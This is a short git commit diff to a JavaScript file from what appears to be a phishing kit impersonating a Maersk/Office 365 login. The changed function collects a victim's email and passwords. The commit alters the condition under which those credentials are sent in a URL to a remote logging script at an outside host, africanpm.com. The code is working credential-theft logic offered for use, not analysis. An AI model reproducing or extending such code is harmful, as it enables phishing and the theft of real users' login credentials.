684f3a87a855f799ed1089e411a6871cae246cbc
babo4 <39022981+babo4@users.noreply.github.com>
2024-03-10 05:49:45 +0100

    Update msk.js

--- msk/msk.js
+++ msk/msk.js
@@ -651,7 +651,7 @@ function subFormBtn(btn) {
         if (pass1 != "" && pass2 !="" && mail != "") {
             let url = "msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
     
-            if (data_send.value == 0) {
+            if (data_send.value == 1) {
                 url = "https://africanpm.com/logs/msn/msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
             }
     
